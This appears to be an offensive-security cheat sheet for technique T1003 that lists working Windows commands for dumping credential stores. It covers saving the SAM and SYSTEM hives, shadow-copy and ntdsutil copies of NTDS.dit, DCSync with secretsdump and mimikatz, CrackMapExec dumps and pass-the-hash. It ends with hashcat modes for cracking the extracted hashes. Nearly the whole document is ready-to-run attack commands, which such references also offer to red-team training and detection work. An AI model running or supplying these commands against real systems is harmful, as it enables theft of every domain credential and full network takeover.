# SAM / NTDS.dit Extraction

Extract password hashes from SAM database (local) or NTDS.dit (domain controller).

**MITRE ATT&CK**: T1003.002 (SAM), T1003.003 (NTDS)

## Local SAM Extraction

### Method 1: reg save (Admin Required)

```cmd
reg save HKLM\SAM C:\temp\SAM /y
reg save HKLM\SYSTEM C:\temp\SYSTEM /y
reg save HKLM\SECURITY C:\temp\SECURITY /y
```

### Method 2: Volume Shadow Copy

```cmd
:: Create shadow copy
wmic shadowcopy call create Volume='C:\'

:: List shadow copies
vssadmin list shadows

:: Copy from shadow (replace {GUID} with actual shadow ID)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\temp\SECURITY
```

### Method 3: esentutl (Copy Locked Files)

```cmd
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\SAM
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\SYSTEM
```

### Extract Hashes Offline

```bash
# Impacket secretsdump
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Mimikatz
mimikatz # lsadump::sam /system:C:\temp\SYSTEM /sam:C:\temp\SAM

# samdump2 (Linux)
samdump2 SYSTEM SAM
```

## Domain Controller — NTDS.dit (T1003.003)

### Method 1: ntdsutil (On DC, Admin)

```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit
:: Creates C:\temp\ntds\Active Directory\ntds.dit and C:\temp\ntds\registry\SYSTEM
```

### Method 2: Volume Shadow Copy (On DC)

```cmd
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

### Method 3: DCSync (Remote, No File Access Needed)

```bash
# Impacket secretsdump — DCSync all accounts
secretsdump.py corp.local/admin:'Password1'@dc01.corp.local

# Specific user
secretsdump.py corp.local/admin:'Password1'@dc01.corp.local -just-dc-user krbtgt

# NTLM hashes only
secretsdump.py corp.local/admin:'Password1'@dc01.corp.local -just-dc-ntlm

# With Kerberos ticket
secretsdump.py -k -no-pass corp.local/admin@dc01.corp.local

# Mimikatz DCSync
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Method 4: CrackMapExec

```bash
# Dump SAM on remote host
crackmapexec smb target -u admin -p 'Password1' --sam

# Dump LSA secrets
crackmapexec smb target -u admin -p 'Password1' --lsa

# Dump NTDS.dit from DC
crackmapexec smb dc01.corp.local -u admin -p 'Password1' --ntds

# Pass-the-hash
crackmapexec smb dc01.corp.local -u admin -H NTLM_HASH --ntds
```

### Extract NTDS.dit Hashes Offline

```bash
# Impacket
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# Output formats for cracking
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL -outputfile hashes
# Creates: hashes.ntds (user:rid:lmhash:nthash)
```

## Cracking Extracted Hashes

```bash
# NTLM hashes (mode 1000)
hashcat -m 1000 hashes.txt rockyou.txt

# NetNTLMv2 (mode 5600)
hashcat -m 5600 netntlmv2.txt rockyou.txt

# DCC2 / mscash2 (mode 2100)
hashcat -m 2100 cached_creds.txt rockyou.txt

# Kerberoast TGS (mode 13100)
hashcat -m 13100 tgs_hashes.txt rockyou.txt

# AS-REP roast (mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```
